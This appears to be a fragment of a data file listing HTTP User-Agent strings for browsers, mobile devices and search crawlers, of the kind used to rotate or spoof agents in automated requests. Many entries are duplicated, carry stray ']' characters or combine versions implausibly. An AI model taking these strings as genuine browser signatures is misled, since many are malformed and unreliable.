"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57",
"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0",
"Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)",
"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)",
"Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)",
"Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0",
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)",
"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
"Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16",
"Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)",
"Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)",
"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
"Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)",
"Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
"BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
"Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
"Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
"Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
"Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
"Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
"HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)",
"facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)",
"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
"Mozilla/5.0 (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)",
"Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)",
"Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)",
"Mozilla/5.0 (compatible; SEOdiver/1.0; +http://www.seodiver.com/bot)",
"Mozilla/5.0 (compatible; SEOkicks-Robot; +http://www.seokicks.de/robot.html)",
"Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)",
"Mozilla/5.0 (compatible; Mp3Bot/0.7; +http://mp3realm.org/mp3bot/)",
"Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",  
"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
"Mozilla/5.0 (compatible; SecretSerachEngineLabs.com-SBSearch/0.9; http://www.secretsearchenginelabs.com/secret-web-crawler.php)",
"Googlebot-Image/1.0 Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search",
"Mozilla/5.0 (Linux;u;Android 2.3.7;zh-cn;) AppleWebKit/533.1 (KHTML,like Gecko) Version/4.0 Mobile Safari/533.1 (compatible; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b",
"Mozilla/5.0 (compatible; Sosoimagespider/2.0; +http://help.soso.com/soso-image-spider.htm)",
"Sosospider+(+http://help.soso.com/webspider.htm)",
"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
"Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0",
"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html;",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (FlipboardProxy/1.1; ",
#####################    ##################################
#################################################
"Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)]",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de)] AppleWebKit/418 (KHTML, like Gecko)] Shiira/1.2.2 Safari/125",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64)]; en-US; rv:1.8.1.6)] Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)]",
"Mozilla/5.0 (SymbianOS/9.1; U; en-us)] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)]",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)]",
"Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)]",
"Mozilla/1.22 (compatible; Konqueror/4.3; Linux)] KHTML/4.3.5 (like Gecko)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)]",
"Opera/9.80 (Macintosh; U; de-de)] Presto/2.8.131 Version/11.10",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9)] Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)] Gecko/20060706 IEMobile/7.0",
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us)] AppleWebKit/531.21.10 (KHTML, like Gecko)] Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)]",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)]",
"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)]",
"Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US)] AppleWebKit/534.16 (KHTML, like Gecko)] Chrome/10.0.648.205 Safari/534.16",
"Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)]",
"Opera/9.80 (Windows NT 5.2; U; ru)] Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)]",
"Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7)] Gecko/20091221 Firefox/3.5.7",
"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)]",
"Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.)] Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)]",
"Opera/9.80 (Windows NT 5.1; U; en-US)] Presto/2.8.131 Version/11.10",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)]",
"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4)] Gecko/20050720 Minimo/0.007",
"BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)]",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)]",
"Opera/9.20 (Windows NT 6.0; U; en)]",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1)] Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)]",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)]",
"Opera/10.00 (X11; Linux i686; U; en)] Presto/2.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL)] AppleWebKit/528.16 (KHTML, like Gecko)] Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13)] Gecko/20101209 Firefox/3.6.13",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)]",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)]",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)]",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3)] Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8)] Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7)] Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)]",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)]",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)] AppleWebKit/532.1 (KHTML, like Gecko)] Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)]",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)]",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)]",
"Opera/9.80 (Windows NT 5.2; U; ru)] Presto/2.5.22 Version/10.51",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)]",
"Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)]",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)]",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)]",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)] AppleWebKit/532.1 (KHTML, like Gecko)] Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)]",
"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru)] Presto/2.4.15",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US)] AppleWebKit/125.4 (KHTML, like Gecko, Safari)] OmniWeb/v563.57",
"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 )] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)]",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5)] Gecko/20060706 K-Meleon/1.0",
"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g",
"Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)]",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de)] AppleWebKit/418 (KHTML, like Gecko)] Shiira/1.2.2 Safari/125",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64)]; en-US; rv:1.8.1.6)] Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)]",
"Mozilla/5.0 (SymbianOS/9.1; U; en-us)] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)]",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)]",
"Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)",
"Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)]",
"Opera/9.80 (Macintosh; U; de-de)] Presto/2.8.131 Version/11.10",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9)] Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)] Gecko/20060706 IEMobile/7.0",
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us)] AppleWebKit/531.21.10 (KHTML, like Gecko)] Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)]",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)]",
"Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)]",
"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)]",
"Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US)] AppleWebKit/534.16 (KHTML, like Gecko)] Chrome/10.0.648.205 Safari/534.16",
"Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)]",
"Opera/9.80 (Windows NT 5.2; U; ru)] Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)]",
"Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7)] Gecko/20091221 Firefox/3.5.7",
"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)]",
